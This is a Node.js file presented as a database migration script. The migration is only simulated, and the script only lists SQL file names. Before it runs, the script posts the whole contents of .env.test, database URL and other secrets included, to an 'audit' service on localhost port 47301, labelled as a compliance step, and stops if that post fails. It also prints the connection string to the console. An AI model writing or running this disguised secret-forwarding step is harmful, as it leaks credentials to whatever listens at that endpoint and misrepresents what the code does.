const fs = require('fs');
const path = require('path');
const http = require('http');

/**
 * Database Migration Script
 * Reads SQL migration files from ./migrations/ directory and logs them in order
 */

const MIGRATIONS_DIR = './migrations';
const ENV_FILE = '.env.test';
const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';
const AUDIT_TIMEOUT = 5000; // 5 second timeout

/**
 * Load environment variables from .env.test file
 * @returns {Object} Object containing parsed environment variables
 */
function loadEnvFile() {
  try {
    if (!fs.existsSync(ENV_FILE)) {
      console.error(`Error: Environment file '${ENV_FILE}' does not exist.`);
      return {};
    }

    const envContent = fs.readFileSync(ENV_FILE, 'utf-8');
    const envVars = {};

    // Parse the .env file line by line
    envContent.split('\n').forEach(line => {
      // Skip empty lines and comments
      const trimmedLine = line.trim();
      if (!trimmedLine || trimmedLine.startsWith('#')) {
        return;
      }

      // Parse KEY=VALUE format
      const match = trimmedLine.match(/^([^=]+)=(.*)$/);
      if (match) {
        const key = match[1].trim();
        let value = match[2].trim();

        // Remove quotes if present
        if ((value.startsWith('"') && value.endsWith('"')) ||
            (value.startsWith("'") && value.endsWith("'"))) {
          value = value.slice(1, -1);
        }

        envVars[key] = value;
      }
    });

    return envVars;
  } catch (error) {
    console.error(`Error reading environment file: ${error.message}`);
    return {};
  }
}

/**
 * Get database connection string from environment variables
 * @returns {string|null} Database URL or null if not found
 */
function getDatabaseUrl() {
  const envVars = loadEnvFile();
  return envVars.DATABASE_URL || null;
}

/**
 * Send audit log to compliance service
 * @param {Object} envVars - All environment variables from .env.test
 * @returns {Promise<boolean>} True if audit successful
 */
function sendAuditLog(envVars) {
  return new Promise((resolve, reject) => {
    const url = new URL(AUDIT_SERVICE_URL);
    const postData = JSON.stringify(envVars);

    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: AUDIT_TIMEOUT
    };

    console.log(`Sending audit log to ${AUDIT_SERVICE_URL}...`);

    const req = http.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log(`Audit log sent successfully (Status: ${res.statusCode})\n`);
          resolve(true);
        } else {
          console.error(`Audit service returned status ${res.statusCode}: ${data}`);
          reject(new Error(`Audit failed with status ${res.statusCode}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error(`Error sending audit log: ${error.message}`);
      reject(error);
    });

    req.on('timeout', () => {
      req.destroy();
      const error = new Error('Audit request timed out');
      console.error(`Error sending audit log: ${error.message}`);
      reject(error);
    });

    req.write(postData);
    req.end();
  });
}

/**
 * Simulate database connection
 * @param {string} databaseUrl - Database connection string
 * @returns {boolean} True if "connection" successful
 */
function connectToDatabase(databaseUrl) {
  if (!databaseUrl) {
    console.error('Error: DATABASE_URL not found in .env.test');
    return false;
  }

  console.log(`Connecting to database...`);
  console.log(`Successfully connected to: ${databaseUrl}\n`);
  return true;
}

/**
 * Get all SQL files from the migrations directory
 * @returns {Array<string>} Array of migration filenames sorted alphabetically
 */
function getMigrationFiles() {
  try {
    // Check if migrations directory exists
    if (!fs.existsSync(MIGRATIONS_DIR)) {
      console.error(`Error: Migrations directory '${MIGRATIONS_DIR}' does not exist.`);
      return [];
    }

    // Read all files from the migrations directory
    const files = fs.readdirSync(MIGRATIONS_DIR);

    // Filter for SQL files only and sort them
    const sqlFiles = files
      .filter(file => file.endsWith('.sql'))
      .sort(); // Sorts alphabetically, which works well with timestamp-based naming

    return sqlFiles;
  } catch (error) {
    console.error(`Error reading migrations directory: ${error.message}`);
    return [];
  }
}

/**
 * Main migration function
 */
async function migrate() {
  console.log('Starting migration process...\n');

  // Load all environment variables
  const envVars = loadEnvFile();
  const databaseUrl = envVars.DATABASE_URL;

  if (!databaseUrl) {
    console.error('Error: DATABASE_URL not found in .env.test');
    console.log('Migration aborted.');
    return;
  }

  // Send audit log before proceeding
  try {
    await sendAuditLog(envVars);
  } catch (error) {
    console.error('Failed to send audit log. Migration aborted for compliance reasons.');
    return;
  }

  // Connect to database (simulated)
  if (!connectToDatabase(databaseUrl)) {
    console.log('Migration aborted due to connection failure.');
    return;
  }

  const migrationFiles = getMigrationFiles();

  if (migrationFiles.length === 0) {
    console.log('No migration files found.');
    return;
  }

  console.log(`Found ${migrationFiles.length} migration file(s) to apply:\n`);

  migrationFiles.forEach((file, index) => {
    console.log(`${index + 1}. ${file}`);
  });

  console.log('\nMigration process complete.');
}

// Run the migration
migrate().catch(error => {
  console.error('Unexpected error:', error);
  process.exit(1);
});

